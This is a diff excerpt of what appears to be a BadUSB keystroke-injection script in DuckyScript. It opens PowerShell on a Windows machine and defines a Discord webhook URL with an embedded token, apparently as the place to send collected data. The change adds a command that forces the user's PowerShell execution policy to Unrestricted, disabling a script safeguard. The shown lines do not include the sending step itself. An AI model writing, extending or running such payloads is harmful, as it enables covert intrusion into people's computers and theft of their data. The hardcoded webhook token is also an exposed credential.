@@ -6,6 +6,8 @@ GUI r
 DELAY 500
 STRINGLN powershell
 DELAY 1000
+STRINGLN Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
+DELAY 1000
 STRINGLN $webhook_url = "https://discord.com/api/webhooks/1338311634757746750/Qi7ydqNIEvqJ_Zbbrv-N4Ekj7HGo7vRfUm7Q14Buccb0G5Bf4TbUwShrylHZHCZ3lVL-"
 DELAY 1000
 STRINGLN $headers = @{"Content-Type" = "application/json"}
